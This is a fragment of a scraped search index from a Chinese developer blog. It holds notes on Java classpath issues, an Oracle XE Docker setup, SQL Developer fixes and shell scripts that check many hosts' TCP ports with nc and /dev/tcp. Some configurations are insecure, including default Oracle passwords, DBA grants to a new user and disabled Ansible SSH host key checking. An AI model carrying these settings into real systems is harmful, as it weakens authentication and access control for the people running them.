Dependency Management in Visual Studio Code In case VS Code throws an error for a classpath issue, try setting your classpath manually by either setting the CLASSPATH environment variable or editing the .classpath file with the path to the JAR file: 看樣子 maven 不能設定 classpath 相關連結 Maven管理的jar没有发布到WEB-INF/lib下的解决方案_java的涟漪-CSDN博客 （三）Java资源文件和路径相关扫盲 - 知乎 java项目中的classpath到底是什么 - 简书 java - Can I add jars to maven 2 build classpath without installing them? - Stack Overflow 沒法對 Project 做 但這個對我的專案沒什麼用 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:10:2","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"vsocde 對整個 workspace 開啟 \u003cclasspathentry combineaccessrules=\"false\" kind=\"src\" path=\"/xxxx-common\"/\u003e 發現對整個 workspace 開啟 程式就可以關連到 Project 程式 手動加真的太慢了 用 Eclipse 做設定會寫到 .classpath 檔案 缺點還是需要手動加 這個方法是參考[vscode] java 사용시 세팅 관련 原本我是想用 * 加入 jar 檔案 但這邊說不能這樣設定 使用單筆 jar 進去 vsocde就能順利認得 class 題外話 小記 Classpath 加 Project 時候 發步 JBOSS 時候 WEB-INF/lib/裡面會加入到剛剛加的 Project WAR 檔 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:10:3","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"add project(classpath) A Project 包 jar 檔時候，被 B Project 引入時候，我發現 A project java的打包成jar方法 - 學而時習之 intellij与eclipse默认快捷键对比 - 简书 Maven查找依赖树，解决jar包冲突问题_Java_Epic丶玖遇-CSDN博客 Jar 包依赖冲突排查思路和解决方法（logback + slf4j-log4j12） - 掘金 重新看待Jar包冲突问题及解决方案 - 簡書 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:10:4","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"ANT [JAVA] 用Ant打包war的簡單流程 | 阿輝的零碎筆記 - 點部落 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:11:0","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Docker"],"content":"最近要看 DB 工具是否能正常連 Oracle 簡單使用 Docker 來架設環境 componhead/docker-oracle-xe-11g: My oracle xe 11g build 上面這版docker build . -t oracle-xe-11g 帳號密碼 system,oracle 這樣就能進去了 version: '2' services: oracle: image: oracle-xe-11g restart: always #如果docker容器由于一些问题挂掉的化，docker-composer会自动把容器给启动起来 ports: - 1521:1521 - 8080:8080 docker-compose up -d 就可以執行環境，但要等一下時間 docker-compose logs -f 看到最後一段就可以使用了 oracle_1 | ls: cannot access /u01/app/oracle/oradata: No such file or directory oracle_1 | Database not initialized. Initializing database. oracle_1 | Setting up: oracle_1 | processes=500 oracle_1 | sessions=555 oracle_1 | transactions=610 oracle_1 | If you want to use different parameters set processes, sessions, transactions env variables and consider this formula: oracle_1 | processes=x oracle_1 | sessions=x*1.1+5 oracle_1 | transactions=sessions*1.1 oracle_1 | oracle_1 | Oracle Database 11g Express Edition Configuration oracle_1 | ------------------------------------------------- oracle_1 | This will configure on-boot properties of Oracle Database 11g Express oracle_1 | Edition. The following questions will determine whether the database should oracle_1 | be starting upon system boot, the ports it will use, and the passwords that oracle_1 | will be used for database accounts. Press \u003cEnter\u003e to accept the defaults. oracle_1 | Ctrl-C will abort. oracle_1 | oracle_1 | Specify the HTTP port that will be used for Oracle Application Express [8080]: oracle_1 | Specify a port that will be used for the database listener [1521]: oracle_1 | Specify a password to be used for database accounts. Note that the same oracle_1 | password will be used for SYS and SYSTEM. Oracle recommends the use of oracle_1 | different passwords for each database account. This can be done after oracle_1 | initial configuration: oracle_1 | Confirm the password: oracle_1 | oracle_1 | Do you want Oracle Database 11g Express Edition to be started on boot (y/n) [y]: oracle_1 | Starting Oracle Net Listener...Done oracle_1 | Configuring database...Done oracle_1 | Starting Oracle Database 11g Express Edition instance...Done oracle_1 | Installation completed successfully. oracle_1 | Database initialized. Please visit http://#containeer:8080/apex to proceed with configuration oracle_1 | Oracle Database 11g Express Edition instance is already started oracle_1 | oracle_1 | Starting import from '/docker-entrypoint-initdb.d': oracle_1 | found file /docker-entrypoint-initdb.d//docker-entrypoint-initdb.d/* oracle_1 | [IMPORT] /entrypoint.sh: ignoring /docker-entrypoint-initdb.d/* oracle_1 | oracle_1 | Import finished oracle_1 | oracle_1 | Database ready to use. Enjoy! ;) ","date":"2020-03-07","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A8-docker-%E5%BB%BA%E7%BD%AE-oracle-%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/:0:0","tags":["docker","oracle"],"title":"快速用 docker 建置 oracle 環境方法","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A8-docker-%E5%BB%BA%E7%BD%AE-oracle-%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/"},{"categories":["Docker"],"content":"其他可參考設定 docker安装wnameless/oracle-xe-11g并运行（手写超详细） - 哈喽，小枫 - 博客园 使用 Docker Oracle | Zoctan’s Blog acktsw/oracle-xe-11g Dockerfile - Docker Hub 這個不知道為什麼帳號密碼無法登入，不過 ssh server 設定可以當參考 docker compose安装oracle_数据库_落叶飘零z的博客-CSDN博客 ","date":"2020-03-07","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A8-docker-%E5%BB%BA%E7%BD%AE-oracle-%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/:1:0","tags":["docker","oracle"],"title":"快速用 docker 建置 oracle 環境方法","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A8-docker-%E5%BB%BA%E7%BD%AE-oracle-%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/"},{"categories":["Docker"],"content":"新增資料表前置作業 其實上面安裝好，不能馬上建制資料表 後來查了一下，要用新增使用者帳號去做 SID 沒有找到修改的方法 XE版本裡只能有一個instance， 我將SID修改了以後貌似會報錯，所以SID就不用修改了。 BASE和HOME兩個變量後儘量不要加斜線 ‘/’ ,有可能會報錯，雖然不知到為什麼… 同時，TNS_ADMIN這個變量一定要有。 參考Linux下安裝Oracle Database 11g Express Edition_Perserve In Learning-CSDN博客 ","date":"2020-03-07","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A8-docker-%E5%BB%BA%E7%BD%AE-oracle-%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/:2:0","tags":["docker","oracle"],"title":"快速用 docker 建置 oracle 環境方法","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A8-docker-%E5%BB%BA%E7%BD%AE-oracle-%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/"},{"categories":["Docker"],"content":"Oracle 11帳號密碼 這邊紀錄 Dbeaver 登入 user:system pwd: oracle normal user: sys pwd: oracle dba 這邊進去不能新增資料表 要新增帳號 dbeaver 可以新增模式比較快 新增帳號還序要設定權限 GRANT CONNECT, RESOURCE, DBA TO miles; 設定玩資料夾就可以建制了 這邊也有發現 Oracle 12 上新增帳號設定需要特別設定 ALTER SESSION SET \"_ORACLE_SCRIPT\"=TRUE; CREATE USER miles IDENTIFIED BY 123456; GRANT CONNECT, RESOURCE, DBA TO miles; ALTER SESSION SET \"_ORACLE_SCRIPT\"=FALSE; 參考: [Docker] 使用 Docker 建立 Oracle 服務 - Miles’s Journey 相關連結 在 Docker 中建立 Oracle 12c 的測試主機 | 想不起來而已 使用 Docker 建立 Oracle 12c \u0026 新增使用者建立範例資料庫 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 在 CentOS 安裝 Oracle XE 18c-黑暗執行緒 使用 Docker Oracle | Zoctan’s Blog CENTOS 7 使用Docker安装oracle 11g - 特拉仔的个人空间 - OSCHINA 批处理执行多个SQL文件到oracle - jack_Meng - 博客园 ","date":"2020-03-07","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A8-docker-%E5%BB%BA%E7%BD%AE-oracle-%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/:3:0","tags":["docker","oracle"],"title":"快速用 docker 建置 oracle 環境方法","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A8-docker-%E5%BB%BA%E7%BD%AE-oracle-%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/"},{"categories":["Docker"],"content":"docker-entrypoint-initdb.d for f in /docker-entrypoint-initdb.d/*; do echo \"found file /docker-entrypoint-initdb.d/$f\" case \"$f\" in *.sh) echo \"[IMPORT] $0: running $f\"; . \"$f\" ;; *.sql) echo \"[IMPORT] $0: running $f\"; echo \"exit\" | su oracle -c \"NLS_LANG=.$CHARACTER_SET $ORACLE_HOME/bin/sqlplus -S / as sysdba @$f\"; echo ;; *.dmp) echo \"[IMPORT] $0: running $f\"; impdp $f ;; *) echo \"[IMPORT] $0: ignoring $f\" ;; esac echo done 由於這個關係，我可以簡單設定 db schmema create 語法 init.sql 放在 /docker-entrypoint-initdb.d/ 裡面放 sql 資料夾 注意，sql 資料夾並不會執行(* 只會抓到同意層資料) init.sql CREATE USER XXXX IDENTIFIED BY XXXX; GRANT CONNECT, RESOURCE, DBA TO XXXX; CREATE USER XXXXMGR IDENTIFIED BY XXXX; alter session set current_schema=XXXXMGR; @/docker-entrypoint-initdb.d/sql/schema/xxxx.sql list 資料夾所有目錄方法 find pwd -type f 就可把相關 sql 用出來 docker-compose.yml 留一下 version: '2' services: oracle: image: oracle-xe-11g restart: always #如果docker容器由于一些问题挂掉的化，docker-composer会自动把容器给启动起来 ports: - 1521:1521 - 8080:8080 - 22:22 volumes: - ./docker-entrypoint-initdb.d/:/docker-entrypoint-initdb.d/ environment: - LC_ALL=C.UTF-8 ","date":"2020-03-07","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A8-docker-%E5%BB%BA%E7%BD%AE-oracle-%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/:4:0","tags":["docker","oracle"],"title":"快速用 docker 建置 oracle 環境方法","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E7%94%A8-docker-%E5%BB%BA%E7%BD%AE-oracle-%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"最近使用 sqldeveloper 開啟出現問題，瞬間打開會閃退 網路上查到一些原因 但都無法解決 網路上有看到三種解決方法，這邊整理一下 ","date":"2020-03-07","objectID":"/blog/posts/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/:0:0","tags":["sqldeveloper","oracle"],"title":"sqldeveloper 打開閃退解決方法","uri":"/blog/posts/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"抓舊版 jdk 這邊是網路大多數都是使用這個方法，但我無法解決。 我發現使用這個都是抓 sqldeveloper 不包含 jdk 版本 通常 jdk 版本不能太新(需要 1.6 版本) 還有需要設定 conf jdk 路徑 sqldeveloper.conf 設定 SetJavaHome 可參考Oracle 11g自带的sqldeveloper.exe打不开问题_数据库_weixin_38569499的博客-CSDN博客 ","date":"2020-03-07","objectID":"/blog/posts/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/:1:0","tags":["sqldeveloper","oracle"],"title":"sqldeveloper 打開閃退解決方法","uri":"/blog/posts/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"清除使用者暫存資料 In my case i had 2 folders under C:\\Users\\username\\AppData\\Roaming\\ sqldeveloper SQL developer after removing both of them and launching installation dir\\sqldeveloper\\sqldeveloper\\bin\\sqldeveloper64.exe it worked. 刪除 C:\\Users\\username\\AppData\\Roaming\\ 裡面的 sqldeveloper,SQL developer 兩個資料夾 就可以正常運行 仔細想想一開始打開 sqldeveloper 我有移動過位置 不知道是不是這個關係，所以才會導致? ","date":"2020-03-07","objectID":"/blog/posts/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/:2:0","tags":["sqldeveloper","oracle"],"title":"sqldeveloper 打開閃退解決方法","uri":"/blog/posts/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"看到奇怪的解決方式 試過，我的不是這個問題 SQL Developer 開啟失敗解決辦法 - IT閱讀 ","date":"2020-03-07","objectID":"/blog/posts/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/:3:0","tags":["sqldeveloper","oracle"],"title":"sqldeveloper 打開閃退解決方法","uri":"/blog/posts/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"Dbeaver 連 OJDBC 方法 Dbeaver 會導向官網叫你下載 OJDBC ，但這個有分版本 我因為懶惰使用 sqldeveloper 裡面 OJDBC (*.jar) 可以登入，但查詢 SQL 會有錯誤訊息 org.jkiss.dbeaver.model.sql.DBSQLException: SQL 错误: jdbc 驱动内部错误 at org.jkiss.dbeaver.model.impl.jdbc.exec.JDBCStatementImpl.executeStatement(JDBCStatementImpl.java:134) at org.jkiss.dbeaver.ui.editors.sql.execute.SQLQueryJob.executeStatement(SQLQueryJob.java:486) at org.jkiss.dbeaver.ui.editors.sql.execute.SQLQueryJob.lambda$0(SQLQueryJob.java:424) at org.jkiss.dbeaver.model.exec.DBExecUtils.tryExecuteRecover(DBExecUtils.java:159) at org.jkiss.dbeaver.ui.editors.sql.execute.SQLQueryJob.executeSingleQuery(SQLQueryJob.java:416) ... 後來我發現，要去官網抓 ojdbc-full.tar.gz 匯出全部 jar ，去設定 Dbeaver 就能設定了 注意 OJDBC 也有分版本，要使用對應 Oracle 版本 ","date":"2020-03-07","objectID":"/blog/posts/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/:4:0","tags":["sqldeveloper","oracle"],"title":"sqldeveloper 打開閃退解決方法","uri":"/blog/posts/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"想關連結 Oracle 11g自带的sqldeveloper.exe打不开问题_数据库_weixin_38569499的博客-CSDN博客 sql - SQLDeveloper not starting - Stack Overflow Oracle SQL Developer 小技巧 #3 : 電腦當機、沒存檔救回之前編寫的SQL Script - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2020-03-07","objectID":"/blog/posts/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/:5:0","tags":["sqldeveloper","oracle"],"title":"sqldeveloper 打開閃退解決方法","uri":"/blog/posts/sqldeveloper-%E6%89%93%E9%96%8B%E9%96%83%E9%80%80%E6%AA%A2%E6%9F%A5%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"最近要測試大量主機 Port ，看裡面東西有沒有開通 使用大量 telnet ip port 非常花很多時間 最近在想有沒有好用的工具方便我們檢查 ","date":"2020-03-07","objectID":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/:0:0","tags":["linux","shell"],"title":"檢查大量不同 IP 跟 Port 方法","uri":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"建立多台 vagrant 連線 Vagrant.configure(\"2\") do |config| config.vm.provision \"shell\", inline: \"echo Hello\" config.vm.define \"web\" do |web| web.vm.box = \"ubuntu/xenial64\" web.vm.network \"private_network\", ip: \"192.168.50.2\" end config.vm.define \"db\" do |db| db.vm.box = \"ubuntu/xenial64\" db.vm.network \"private_network\", ip: \"192.168.50.3\" end end ","date":"2020-03-07","objectID":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/:1:0","tags":["linux","shell"],"title":"檢查大量不同 IP 跟 Port 方法","uri":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"nc 檢查法 $ timeout 2 bash -c \"\u003c/dev/tcp/canyouseeme.org/80\"; echo $? 0 $ timeout 2 bash -c \"\u003c/dev/tcp/canyouseeme.org/81\"; echo $? 124 $ timeout --preserve-status 2 bash -c \"\u003c/dev/tcp/canyouseeme.org/81\"; echo $? 143 $ nc -w 2 -v canyouseeme.org 80 \u003c/dev/null; echo $? Connection to canyouseeme.org 80 port [tcp/http] succeeded! 0 $ nc -w 2 -v canyouseeme.org 81 \u003c/dev/null; echo $? nc: connect to canyouseeme.org port 81 (tcp) timed out: Operation now in progress 1 Test if remote TCP port is open from a shell script - Stack Overflow Bash/nc: netcat as a simple port scanner Firxiao/check_service_ports: A tool (based nc) check service’s tcp or udp is opened or closed for i in {10.21.xxx.yyy,10.21.xxx.yyy,10.23.xxx.yyy}; do for j in {5501,5502,5503,5504,7701,7702,7703,7704,5551,5552,5553,7771,7772,7773}; do (echo \u003e /dev/tcp/${i}/${j}) \u003e /dev/null 2\u003e\u00261 \u0026\u0026 echo \"${i}:${j} :: it's getting connected\" || echo \"${i}:${j} :: it's not connecting\" done done bash - Shell Script - telnet multiple hosts:ports - Stack Overflow 發現這個範例還滿適合我現在的需求 用這個 shell 小改，順便加個顏色Bash Shell 顯示 顏色的語法 | Tsung’s Blog #!/bin/bash COLOR_REST='\\e[0m'; COLOR_GREEN='\\e[0;32m'; COLOR_RED='\\e[0;31m'; for i in tw.yahoo.com google.com.tw; do for j in 80 233; do (nc -zv -w 5 ${i} ${j}) \u003e /dev/null 2\u003e\u00261 \u0026\u0026 echo -e \"${COLOR_GREEN}${i}:${j} :: it's getting connected${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: it's not connecting${COLOR_REST}\" done done 顏色 echo 需要加 -e 第一次看到 shell 可以用 {}包迴圈 不過只有單筆會有問題樣子 所以我這邊有簡單調整另外一種寫法 例外還有多種運用 第6期：使用nc批量做网络连通性测试 - 知乎 #!/bin/bash # checking network connectivity # IPs and ports to check # Ignore blank lines and treat hash sign as comments # comments will be kept as a comment of result IP_PORT=\" # local host 127.0.0.1 22 127.0.0.1 21 # well known sites www.google.com 80 www.baidu.com 80 \" # checking echo \"$IP_PORT\" | grep -Ev \"^$\" | while read line;do # simply print comment line echo \"$line\" | grep -qE \"^#\" if [ $? -eq 0 ];then echo \"$line\" continue fi # normal line with ip and port connectFlag=\"DOWN\" nc -z -w 1 $line if [ $? -eq 0 ];then connectFlag=\"UP\" fi printf \"%-20s %5s %5s\\n\" $line $connectFlag done 以下方案失敗 QQ 先留著 ","date":"2020-03-07","objectID":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/:2:0","tags":["linux","shell"],"title":"檢查大量不同 IP 跟 Port 方法","uri":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"使用 ansible 方法 Ansible Playbook for network port checking from host level — OpenShift as example 有看到有人用 ansible 做出符合我的需求工具 這邊就順便驗證是否可以正常執行 ","date":"2020-03-07","objectID":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/:3:0","tags":["linux","shell"],"title":"檢查大量不同 IP 跟 Port 方法","uri":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"ansible 安裝 window 不能安裝 ansible Installing Ansible — Ansible Documentation 更多系統可以參考上面連結 sudo apt update sudo apt install software-properties-common sudo apt-add-repository --yes --update ppa:ansible/ansible sudo apt install ansible ","date":"2020-03-07","objectID":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/:3:1","tags":["linux","shell"],"title":"檢查大量不同 IP 跟 Port 方法","uri":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"ansible FAILED =\u003e Using a SSH password instead of a key is not possible because Host Key checking is enabled and sshpass does not support this. Please add this host’s fingerprint to your known_hosts file to manage this host. ansible小结（四）ansible.cfg与默认配置 - 运维之路 host_key_checking = False ","date":"2020-03-07","objectID":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/:3:2","tags":["linux","shell"],"title":"檢查大量不同 IP 跟 Port 方法","uri":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"其他類似程式 Check Host - 小巧實用網路監控軟體 ~ 不自量力 の Weithenn Ansible Playbook for network port checking from host level — OpenShift as example Connectivity check WITH Ansible - DEV Community 👩‍💻👨‍💻 testing - Ansible: Other option available for telnet check of open ports? - DevOps Stack Exchange Test if a server is reachable from host and has port open with Ansible - Stack Overflow ansible-testing/test_tcp at master · willthames/ansible-testing guerzon/ansible-netcat: Ansible proof-of-concept - netcat systemd service ","date":"2020-03-07","objectID":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/:4:0","tags":["linux","shell"],"title":"檢查大量不同 IP 跟 Port 方法","uri":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"Window 不使用 telnet 方法 #powershell Test-NetConnection -ComputerName “www.google.com” -Port 443 不知道為什麼我朋友電腦不能使用telnet(有開啟設定) 後來發現有這個指令 利用PowerShell的Test-NetConnection來取代Telnet來檢查網站的Port有沒有被開啟 | by CarterTsai | Medium 多台電腦指令 '192.168.0.101','192.168.0.102','Computer-012' | Test-NetConnection -Port 135 Get-Content -Path .\\computers.txt | Test-NetConnection -Port 1 更多相關: Run Test-NetConnection on multiple machines, the best way：PowerShell Test connection to servers on several ports - Powershellbros.com ","date":"2020-03-07","objectID":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/:5:0","tags":["linux","shell"],"title":"檢查大量不同 IP 跟 Port 方法","uri":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"工作用測 IP PORT 的腳本 記得把 IP1,IP2 關鍵字換成IP #!/bin/bash COLOR_REST='\\e[0m'; COLOR_GREEN='\\e[0;32m'; COLOR_RED='\\e[0;31m'; echo \"正式環境\"; # 443 for i in {IP1,IP2,IP3}; do for j in 443; do (nc -zv -w 5 ${i} ${j}) \u003e /dev/null 2\u003e\u00261 \u0026\u0026 echo -e \"${COLOR_GREEN}${i}:${j} :: 可以連結${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: 不能連結${COLOR_REST}\" done done # 9101 for i in {IP1,IP2,IP3} do for j in 9101; do (nc -zv -w 5 ${i} ${j}) \u003e /dev/null 2\u003e\u00261 \u0026\u0026 echo -e \"${COLOR_GREEN}${i}:${j} :: 可以連結${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: 不能連結${COLOR_REST}\" done done # 1549 for i in IP1 do for j in 1549; do (nc -zv -w 5 ${i} ${j}) \u003e /dev/null 2\u003e\u00261 \u0026\u0026 echo -e \"${COLOR_GREEN}${i}:${j} :: 可以連結${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: 不能連結${COLOR_REST}\" done done echo \"驗證環境\"; # 26112 for i in {IP1,IP2}; do for j in 26112; do (nc -zv -w 5 ${i} ${j}) \u003e /dev/null 2\u003e\u00261 \u0026\u0026 echo -e \"${COLOR_GREEN}${i}:${j} :: 可以連結${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: 不能連結${COLOR_REST}\" done done # 9101 for i in {IP1,IP2,IP3}; do for j in 9101; do (nc -zv -w 5 ${i} ${j}) \u003e /dev/null 2\u003e\u00261 \u0026\u0026 echo -e \"${COLOR_GREEN}${i}:${j} :: 可以連結${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: 不能連結${COLOR_REST}\" done done # 有兩個 port 1549,1561 for i in IP1; do for j in {1549,1561}; do (nc -zv -w 5 ${i} ${j}) \u003e /dev/null 2\u003e\u00261 \u0026\u0026 echo -e \"${COLOR_GREEN}${i}:${j} :: 可以連結${COLOR_REST}\" || echo -e \"${COLOR_RED}${i}:${j} :: 不能連結${COLOR_REST}\" done done ","date":"2020-03-07","objectID":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/:6:0","tags":["linux","shell"],"title":"檢查大量不同 IP 跟 Port 方法","uri":"/blog/posts/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"最近報表需要撈出中文字 找了一些方法可以用 SELECT 句子撈出 這篇尚未整理，有空再測試 ","date":"2020-02-20","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/:0:0","tags":["mysql","regex"],"title":"使用 MySQL 做正規化 (REGEXP) 和 查詢含有中文字串方法","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"UTF-8 中文範圍 utf-8 繁體中文編碼表 範圍 是多少_百度知道 MySQL 判断中文字符 | Cryptospace utf-8,Unicode (UTF-8),utf-8编码,Unicode (UTF-8)编码,utf-8字符,Unicode (UTF-8)字符,utf-8编码对照表,Unicode (UTF-8)编码对照表 整理 Unicode 經常會使用到的內碼區域並透過 Regex 自動比對文字 | The Will Will Web ","date":"2020-02-20","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/:1:0","tags":["mysql","regex"],"title":"使用 MySQL 做正規化 (REGEXP) 和 查詢含有中文字串方法","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"SQL 方法 